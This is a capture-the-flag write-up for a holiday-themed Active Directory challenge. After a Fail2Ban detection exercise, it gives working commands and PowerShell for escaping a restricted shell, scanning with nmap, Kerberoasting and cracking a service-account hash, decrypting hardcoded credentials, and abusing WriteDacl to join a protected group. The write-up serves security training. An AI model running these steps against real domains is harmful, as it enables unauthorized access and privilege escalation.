# Challenge 8: Kerberoasting on an Open Fire

> Obtain the secret sleigh research document from a host on the Elf University domain. What is the first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season? Start by registering as a student on the ElfU Portal. Find Eve Snowshoes in Santa's office for hints.

## The Hint

> Here's what Eve has to say:
>
> Hey there, how's it going? I'm Eve Snowshoes.
>
> Lately I've been spending a lot of cycles worrying about what's going on next door.
>
> Before that, I was checking out Fail2Ban.
>
> It's this slick log scanning tool for Apache web servers.
>
> If you can complete this terminal challenge, I’d be happy to give you some things I’ve learned about Kerberoasting and Active Directory permissions!
>
> Why don't you do some work with Fail2Ban on this Cranberry Pi terminal first, then we’ll talk Kerberoasting and Active Directory. OK?

After launching the terminal challenge, we get the following prompt:

```bash
Jack is trying to break into Santa's workshop!

Santa's elves are working 24/7 to manually look through logs, identify the
malicious IP addresses, and block them. We need your help to automate this so
the elves can get back to making presents!

Can you configure Fail2Ban to detect and block the bad IPs?

 * You must monitor for new log entries in /var/log/hohono.log
 * If an IP generates 10 or more failure messages within an hour then it must
   be added to the naughty list by running naughtylist add <ip>
        /root/naughtylist add 12.34.56.78
 * You can also remove an IP with naughtylist del <ip>
        /root/naughtylist del 12.34.56.78
 * You can check which IPs are currently on the naughty list by running
        /root/naughtylist list

You'll be rewarded if you correctly identify all the malicious IPs with a
Fail2Ban filter in /etc/fail2ban/filter.d, an action to ban and unban in
/etc/fail2ban/action.d, and a custom jail in /etc/fail2ban/jail.d. Don't
add any nice IPs to the naughty list!

*** IMPORTANT NOTE! ***

Fail2Ban won't rescan any logs it has already seen. That means it won't
automatically process the log file each time you make changes to the Fail2Ban
config. When needed, run /root/naughtylist refresh to re-sample the log file
and tell Fail2Ban to reprocess it.

root@bd2f56d04e0f:~#
```

Our task is to build the proper fail2ban configuration to stop all the malicious activity being logged
in `/var/log/hohono.log`. Taking a quick look at the log file in question, we can see the following types of failures:

```
2021-12-27 05:49:54 Login from 42.36.105.164 rejected due to unknown user name
2021-12-27 05:49:58 90.201.63.125 sent a malformed request
2021-12-27 05:51:14 Failed login from 67.190.93.176 for chimney
2021-12-27 07:01:52 Invalid heartbeat 'charlie' from 49.136.27.16
```

We can use these failures to help craft the following `jail`, `filter`, and `action` configuration files:

```bash
# /etc/fail2ban/jail.d/hohono.conf
[hohono]
enabled = true
logpath = /var/log/hohono.log
maxretry = 10
findtime = 1h
bantime = 1h
filter = hohono
action = hohono
```

```bash
# /etc/fail2ban/filter.d/hohono.conf
[Definition]
failregex = Failed login from <HOST> for .+$
            <HOST> sent a malformed request$
            Login from <HOST> rejected due to unknown user name$
            Invalid heartbeat '.+' from <HOST>$
```

```bash
# /etc/fail2ban/action.d/hohono.conf
[Definition]
actionban = /root/naughtylist add <ip>
actionunban = /root/naughtylist del <ip>
```

Once our configuration is in place, we can restart fail2ban and refresh our `hohono.log` to trigger a success:

```bash
# service fail2ban restart
# /root/naughtylist refresh
```

Here's what Eve has to say:

> Fantastic! Thanks for the help!
>
> Hey, would you like to know more about Kerberoasting and Active Directory permissions abuse?
>
> There's a great talk by Chris Davis on this exact subject!
>
> There are also plenty of resources available to learn more about Kerberoasting specifically.
>
> If you have any trouble finding the domain controller on the 10.X.X.X network, remember that, when not running as root, nmap default probing relies on connecting to TCP 80 and 443.
>
> Got a hash that won't crack with your wordlist? OneRuleToRuleThemAll.rule is a great way to grow your keyspace.
>
> Where'd you get your wordlist? CeWL might generate a great wordlist from the ElfU website, but it will ignore digits in terms by default.
>
> So, apropos of nothing, have you ever known system administrators who store credentials in scripts? I know, I know, you understand the folly and would never do it!
>
> The easy way to investigate Active Directory misconfigurations (for Blue and Red alike!) is with Bloodhound, but there are native methods as well.
>
> Oh, and one last thing: once you've granted permissions to your user, it might take up to five minutes for it to propogate throughout the domain.

## The Main Challenge

We can head to the [ElfU Portal](https://register.elfu.org/register) to get started on this task. We are faced with a
registration form:

![Registration](elfu.png)

Once registered, we are provided with some ssh credentials to `grades.elfu.org`. Once we ssh into the box, we see we
have some sort of custom shell:

```bash
===================================================
=      Elf University Student Grades Portal       =
=          (Reverts Everyday 12am EST)            =
===================================================
1. Print Current Courses/Grades.
e. Exit
:
```

We have very limited options here, but by simply passing `CTRL+D` we land ourselves in a python shell:

```bash
===================================================
=      Elf University Student Grades Portal       =
=          (Reverts Everyday 12am EST)            =
===================================================
1. Print Current Courses/Grades.
e. Exit
: Traceback (most recent call last):
  File "/opt/grading_system", line 41, in <module>
    main()
  File "/opt/grading_system", line 26, in main
    a = input(": ").lower().strip()
EOFError
>>>
```

Let's see if we can escape the python shell:

```bash
>>> import os
>>> os.system("/bin/bash")
$
```

Excellent!  Now that we're in, let's do some additional recon. One of the hints had mentioned some interesting ip ranges
in our routing table:

```bash
$ ip route
default via 172.17.0.1 dev eth0
10.128.1.0/24 via 172.17.0.1 dev eth0
10.128.2.0/24 via 172.17.0.1 dev eth0
10.128.3.0/24 via 172.17.0.1 dev eth0
172.17.0.0/16 dev eth0 proto kernel scope link src 172.17.0.2
```

Let's run some nmap scans on these subnets to see if we can identify anything of interest. After scanning the first
subnet, we find the following box, which sticks out from the others like a sore thumb:

```
$ nmap -PS22,445 -sV 10.128.1.0/24
...
Nmap scan report for hhc21-windows-dc.c.holidayhack2021.internal (10.128.1.53)
Host is up (0.00032s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-28 20:29:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: elfu.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: elfu.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=12/28%Time=61CB739D%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We've found a domain controller with the domain `elfu.local0`. If you
watched [Chris Davis' talk on Active Directory Penetration Testing](https://www.youtube.com/watch?v=iMh8FTzepU4), we can
follow his lead and utilize a (luckily available to us) python script `GetUserSPNs.py`:

```bash
$ GetUserSPNs.py  -outputfile spns.txt -dc-ip 10.128.1.53 elfu.local/kljuqejzuq -request
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf  PasswordLastSet             LastLogon                   Delegation
-----------------------------------  --------  --------  --------------------------  --------------------------  ----------
ldap/elfu_svc/elfu                   elfu_svc            2021-10-29 19:25:04.305279  2021-12-28 19:03:30.253243
ldap/elfu_svc/elfu.local             elfu_svc            2021-10-29 19:25:04.305279  2021-12-28 19:03:30.253243
ldap/elfu_svc.elfu.local/elfu        elfu_svc            2021-10-29 19:25:04.305279  2021-12-28 19:03:30.253243
ldap/elfu_svc.elfu.local/elfu.local  elfu_svc            2021-10-29 19:25:04.305279  2021-12-28 19:03:30.253243
```

We are then provided with `spns.txt`:

```
$ cat spns.txt
$krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$f5ebcf631b80ddface08d209300a3eba$d727ee11cb5b6b7fec3a8ed553f17cb49d9bc6b22af3abca50ee967fc6260561053612176a5ef8900e8659ac975310f2e08bab1e3f1f911f66b6872b976eb374cacdb8c4b9ccbd10f53374cc31e4e24a15da15d94fa42f25f72c01ab88338e47159b89c4097739eaf26c6c4e43812ed36b4476f153174c4ec1a0f79b939cdd22088b805a59895ccc0a327c1d842ebbfec9338ce263b3353098b19a45d4fee2cf61c6199027f0b3a1560e4bd35300a824a82bc2fa3c07eb3cf1acc64510e0bcff01a736d88024012bafb3738c487eedaaec28f0594daec05fa06107ddd720c7a3ee6eb254e5dc7ae64e452b0deea65f7136cef87dd69b0163d4146aeb5228532c818fa7b77c204bedc07d1b57e2d7ed9b05f8e8841a1a30f6a3b13e1471a049c57da7b8a3db310baa60b6a8bae5397589fb25c3b941b53deec758f11079ffb4a2971475c5112025e89b86a5f01b632a1f7bd97a320815a53b3ddc4df1b055d4e0e4766232bf82b47092e9fc2fbfdc0a12ac1964ef4d80bcac3fe7f44d8d811c4ddcba44623a745e36c00f85d7e48887d5b358944ce0ba8120b08f912fa2d60e76147304f5b624755ad90998377e5613d91ba0a05f04aafcb10f3e4d02d6bcea38b95e8f921b1f0b3e0e493fd7042783acfedc495d21f5fcd54d9b91ea0eb2e8e71cc7ab1e3c17b92e3ebef534f0781fe3d975ce128a0f511e11406882aeac6e4c026ee34221390d12e79be4769f3f6d84e22b4b3fdf8061bf2ee2ce3673df8c10dec036f43007a8cdee1171238f9304781751c362071ad36d08a2b040d18c5b73198d5bc8f4b28cdf89b8063ba0179b9daff4766b6fae28de9ba72a88bb1f7babcd8926da25ad61ff9b778ed3fbe0fb02cb3b179b0f72dd6a684eacea04be47ef402d932b03efea3d6f9284846f2327f9102e1d3e97577a6f5c15adf0f90bccfee3d405fded9c0768d089a382c4c71d6f5e912f18fb7193d67a7e9a5c3c6bf013c4de5abf48aa692a0f5760a3fb7f49e045d9edb93374c530cbe27b50274adad752e02255921bf6ceb553479bcc9cf5d6d3b52537d59c85797a97e3db653238e5a60c3988c2df07539c8a3c42495d72fd06ea72598873cd8dee1309137d49d1c95af157afeee50fc5955da79dc750d167ec475ef36920605c42fc0c88dc4cbb0790e683f1c4df99486b856b56841f8532e2f36d122bd0462fefb15f8b9f6f19e63dadb28b7290ecc8a1e3f1a9b2752f2eb4bd01747c8c259e0b6b085e651f9d1be5f6d89bcb41f5f429403a182d086968bd564bc36aadb5b1ba3713d057915d40b6a0351309fa7f5b8d4246fd6e6da8b7a30c1380a3a5d6f84743fb1180aa523c8c23371d5fe085ac31126044d3577d63ba14ad5a6138d653e74a4d18bec9c19d90b57ce9245d872da16af607362575303712ae0c9fccd1414eec0aa379a7efae9036b164b0
```

We receive a password hash for the service account `elfu_svc`. We can leverage `CeWL` and `hashcat` to generate a
wordlist and crack the hashed password. As the hint provided suggests, we will also be using
the [OneRuleToRuleThemAll]() `hashcat` rule.

```bash
$ cewl --with-numbers -w wordlist https://register.elfu.org/register
$ hashcat -m 13100 -a 0 ./spns.txt --potfile-disable -r ./rules/OneRuleToRuleThemAll.rule --force -O -w 4 --opencl-device-types 1,2 ./wordlist
...
$krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$f5ebcf631b80ddface08d209300a3eba$d727ee11cb5b6b7fec3a8ed553f17cb49d9bc6b22af3abca50ee967fc6260561053612176a5ef8900e8659ac975310f2e08bab1e3f1f911f66b6872b976eb374cacdb8c4b9ccbd10f53374cc31e4e24a15da15d94fa42f25f72c01ab88338e47159b89c4097739eaf26c6c4e43812ed36b4476f153174c4ec1a0f79b939cdd22088b805a59895ccc0a327c1d842ebbfec9338ce263b3353098b19a45d4fee2cf61c6199027f0b3a1560e4bd35300a824a82bc2fa3c07eb3cf1acc64510e0bcff01a736d88024012bafb3738c487eedaaec28f0594daec05fa06107ddd720c7a3ee6eb254e5dc7ae64e452b0deea65f7136cef87dd69b0163d4146aeb5228532c818fa7b77c204bedc07d1b57e2d7ed9b05f8e8841a1a30f6a3b13e1471a049c57da7b8a3db310baa60b6a8bae5397589fb25c3b941b53deec758f11079ffb4a2971475c5112025e89b86a5f01b632a1f7bd97a320815a53b3ddc4df1b055d4e0e4766232bf82b47092e9fc2fbfdc0a12ac1964ef4d80bcac3fe7f44d8d811c4ddcba44623a745e36c00f85d7e48887d5b358944ce0ba8120b08f912fa2d60e76147304f5b624755ad90998377e5613d91ba0a05f04aafcb10f3e4d02d6bcea38b95e8f921b1f0b3e0e493fd7042783acfedc495d21f5fcd54d9b91ea0eb2e8e71cc7ab1e3c17b92e3ebef534f0781fe3d975ce128a0f511e11406882aeac6e4c026ee34221390d12e79be4769f3f6d84e22b4b3fdf8061bf2ee2ce3673df8c10dec036f43007a8cdee1171238f9304781751c362071ad36d08a2b040d18c5b73198d5bc8f4b28cdf89b8063ba0179b9daff4766b6fae28de9ba72a88bb1f7babcd8926da25ad61ff9b778ed3fbe0fb02cb3b179b0f72dd6a684eacea04be47ef402d932b03efea3d6f9284846f2327f9102e1d3e97577a6f5c15adf0f90bccfee3d405fded9c0768d089a382c4c71d6f5e912f18fb7193d67a7e9a5c3c6bf013c4de5abf48aa692a0f5760a3fb7f49e045d9edb93374c530cbe27b50274adad752e02255921bf6ceb553479bcc9cf5d6d3b52537d59c85797a97e3db653238e5a60c3988c2df07539c8a3c42495d72fd06ea72598873cd8dee1309137d49d1c95af157afeee50fc5955da79dc750d167ec475ef36920605c42fc0c88dc4cbb0790e683f1c4df99486b856b56841f8532e2f36d122bd0462fefb15f8b9f6f19e63dadb28b7290ecc8a1e3f1a9b2752f2eb4bd01747c8c259e0b6b085e651f9d1be5f6d89bcb41f5f429403a182d086968bd564bc36aadb5b1ba3713d057915d40b6a0351309fa7f5b8d4246fd6e6da8b7a30c1380a3a5d6f84743fb1180aa523c8c23371d5fe085ac31126044d3577d63ba14ad5a6138d653e74a4d18bec9c19d90b57ce9245d872da16af607362575303712ae0c9fccd1414eec0aa379a7efae9036b164b0:Snow2021!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_sv...b164b0
Time.Started.....: Tue Dec 28 20:19:18 2021, (1 sec)
Time.Estimated...: Tue Dec 28 20:19:19 2021, (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (./wordlist)
Guess.Mod........: Rules (./rules/OneRuleToRuleThemAll.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3417.2 kH/s (5.53ms) @ Accel:512 Loops:256 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 3134208/4003615 (78.28%)
Rejected.........: 0/3134208 (0.00%)
Restore.Point....: 0/77 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:40448-40704 Iteration:0-256
Candidate.Engine.: Device Generator
Candidates.#1....: The0307 -> cimes
Hardware.Mon.#1..: Temp: 48c Fan:  0% Core:1872MHz Mem:3802MHz Bus:16
```

`hashcat` successfully recovered the password to the service account, which is `Snow2021!`. Let's see if we can progress
further utilizing these credentials. We can begin searching for open SMB shares to see if we can find anything of
interest. The DC doesn't seem to have much of interest, but after a bit of additional exploration of the subnets
identified using `ip route`, we find this machine:

```
Nmap scan report for 10.128.3.30
Host is up (0.00022s latency).
Not shown: 966 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
636/tcp  open  ldapssl
1024/tcp open  kdm
1025/tcp open  NFS-or-IIS
1026/tcp open  LSA-or-nterm
1027/tcp open  IIS
1028/tcp open  unknown
1029/tcp open  ms-lsa
1030/tcp open  iad1
1031/tcp open  iad2
1032/tcp open  iad3
1033/tcp open  netinfo
1034/tcp open  zincite-a
1035/tcp open  multidropper
1036/tcp open  nsstp
1037/tcp open  ams
1038/tcp open  mtqp
1039/tcp open  sbl
1040/tcp open  netsaint
1041/tcp open  danf-ak2
1042/tcp open  afrog
1043/tcp open  boinc
1044/tcp open  dcutility
2222/tcp open  EtherNetIP-1
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
```

Like our DC, this box stands out significantly from the others. Let's see what shares it has available:

```bash
$ smbclient -W elfu.local -U elfu_svc -L 10.128.3.30
Enter ELFU.LOCAL\elfu_svc's password:

        Sharename       Type      Comment
        ---------       ----      -------
        netlogon        Disk
        sysvol          Disk
        elfu_svc_shr    Disk      elfu_svc_shr
        research_dep    Disk      research_dep
        IPC$            IPC       IPC Service (Samba 4.3.11-Ubuntu)
```

`elfu_svc_shr` looks interesting, so let's try to connect:

```bash
$ smbclient -W elfu.local -U elfu_svc //10.128.3.30/elfu_svc_shr
Enter ELFU.LOCAL\elfu_svc's password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Dec  2 16:39:42 2021
  ..                                  D        0  Tue Dec 28 21:35:08 2021
  Get-NavArtifactUrl.ps1              N     2018  Wed Oct 27 19:12:43 2021
  Get-WorkingDirectory.ps1            N      188  Wed Oct 27 19:12:43 2021
  Stop-EtwTraceCapture.ps1            N      924  Wed Oct 27 19:12:43 2021
  create-knownissue-function.ps1      N     2104  Wed Oct 27 19:12:43 2021
  PsTestFunctions.ps1                 N    52454  Wed Oct 27 19:12:43 2021
  StoreIngestionApplicationApi.ps1      N   108517  Wed Oct 27 19:12:43 2021
  Compile-ObjectsInNavContainer.ps1      N     4431  Wed Oct 27 19:12:43 2021
  Run-ConnectionTestToNavContainer.ps1      N    13856  Wed Oct 27 19:12:43 2021
  StoreIngestionIapApi.ps1            N    80725  Wed Oct 27 19:12:43 2021
  Test-SdnKnownIssue.ps1              N     4384  Wed Oct 27 19:12:43 2021
  ...
  ...
```

We get a huge listing of powershell scripts that look to be serving several admin functions. Let's pull all of these
down to our local machine for some further investigation. From `smbclient`, run the following:

```bash
smb: \> prompt off
smb: \> mget *
smb: \> q
```

Now let's change our login shell so we can scp the files back to our local machine:

```bash
$ chsh --shell /bin/bash
```

And from your local machiane:

```
$ scp -P 2222 <user>@grades.elfu.org:~/* .
```

Now that we have the files locally, let's comb through them to see if we can find anything of value:

```bash
$ grep elfu *
GetProcessInfo.ps1:$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
```

Grepping for `elfu` yields one result - opening up `GetProcessInfo.ps1` gives the full script:

```powershell
$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock { Get-Process } -Credential $aCred -Authentication Negotiate
```

If we run this script in a powershell prompt on our `grades.elfu.org` machine, it successfully executes a `Get-Process`
command on the DC - we now have access to the `remote_elf` user account and the DC itself.

We should be able to execute any commands we want by simply modifying `GetProcessInfo.ps1`, but in case we need it
elsewhere, let's decode `remote_elf`''s password:

```powershell
PS > $SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
PS > $aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
PS > $Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($aPass)
PS > $result = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)
PS > [System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)
PS > $result
A1d655f7f5d98b10!
```

Now that we have valid credentials for `remote_elf`, let's go ahead and grab ourselves a remote powershell session:

```powershell
$password = ConvertTo-SecureString "A1d655f7f5d98b10!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $password)
Enter-PSSession -ComputerName 10.128.1.53 -Credential $creds -Authentication Negotiate
[10.128.1.53]: PS C:\Users\remote_elf\Documents>
```

With our new session, let's get some more information about what our user has access to:

```powershell
[10.128.1.53]: PS C:\Users\remote_elf\Desktop> Get-ADUser "remote_elf" -Properties memberof


DistinguishedName : CN=Remote Elf User Account,CN=Users,DC=elfu,DC=local
Enabled           : True
GivenName         : ElfU
MemberOf          : {CN=Remote Management Domain Users,CN=Users,DC=elfu,DC=local, CN=Remote Management
                    Users,CN=Builtin,DC=elfu,DC=local}
Name              : Remote Elf User Account
ObjectClass       : user
ObjectGUID        : d74a6e5f-1354-4d5a-bfc3-afd4cb45ae3a
SamAccountName    : remote_elf
SID               : S-1-5-21-2037236562-2033616742-1485113978-1106
Surname           : Service
UserPrincipalName : remote_elf@elfu.local
```

We can see that `remote_elf` is a member of a couple remote management groups, which doesn't yield much after some
initial exploration. Let's see what other groups the domain houses:

```powershell
[10.128.1.53]: PS C:\Users\remote_elf\Desktop> net group

Group Accounts for \\

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*File Shares
*Group Policy Creator Owners
*Key Admins
*Protected Users
*Read-only Domain Controllers
*RemoteManagementDomainUsers
*ResearchDepartment
*Schema Admins
```

Towards the bottom we see `ResearchDepartment`. If you recalled earlier, the machine at `10.128.3.30` which had
the `elfu_svc_shr` also had another interesting share: `research_dep`. Let's explore this a bit more:

```powershell
$ADSI = [ADSI]"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
$ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount])
...
ActiveDirectoryRights : WriteDacl
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : ELFU\remote_elf
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None
...
```

Bingo, we see that `remote_elf` has `WriteDacl` permissions to the `Research Department` group - so we should be able to
grant a user of our choosing access to resources protected by the group:

```powershell
Add-Type -AssemblyName System.DirectoryServices
$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
$username = "<your_grades_box_user_id>"
$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
$propGUID = [guid]'00000000-0000-0000-0000-000000000000'
$IdentityReference = (New-Object System.Security.Principal.NTAccount("elfu.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"), ([System.Security.AccessControl.AccessControlType] "Allow"), $propGUID, $inheritanceType, $nullGUID
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
$secOptions = $domainDirEntry.get_Options()
$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
$domainDirEntry.RefreshCache()
$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
$domainDirEntry.CommitChanges()
$domainDirEntry.dispose()
```

Once that is done, we can add our user to the `Research Department` group:

```powershell
Add-Type -AssemblyName System.DirectoryServices
$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
$username = "<your_grades_box_user_id>"
$password = "<your_grades_box_user_password>"
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
$user = New-Object System.Security.Principal.NTAccount("elfu.local\$username")
$sid=$user.Translate([System.Security.Principal.SecurityIdentifier])
$b=New-Object byte[] $sid.BinaryLength
$sid.GetBinaryForm($b,0)
$hexSID=[BitConverter]::ToString($b).Replace('-','')
$domainDirEntry.Add("LDAP://<SID=$hexSID>")
$domainDirEntry.CommitChanges()
$domainDirEntry.dispose()
```

If everything worked, we will hopefully be able to gain access to the `research_dep` share:

```bash
$ smbclient -U <your_grades_box_user_id> -W elfu.local //10.128.3.30/research_dep
Enter ELFU.LOCAL\<your_grades_box_user_id>'s password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Dec  2 16:39:42 2021
  ..                                  D        0  Wed Dec 29 08:01:30 2021
  SantaSecretToAWonderfulHolidaySeason.pdf      N   173932  Thu Dec  2 16:38:26 2021

                41089256 blocks of size 1024. 32894544 blocks available
smb: \> mget *
Get file SantaSecretToAWonderfulHolidaySeason.pdf? y
getting file \SantaSecretToAWonderfulHolidaySeason.pdf of size 173932 as SantaSecretToAWonderfulHolidaySeason.pdf (56616.6 KiloBytes/sec) (average 56618.5 KiloBytes/sec)
```

Let's pull the file back to our local machine, where we can reveal the answer to this challenge: `Kindness` 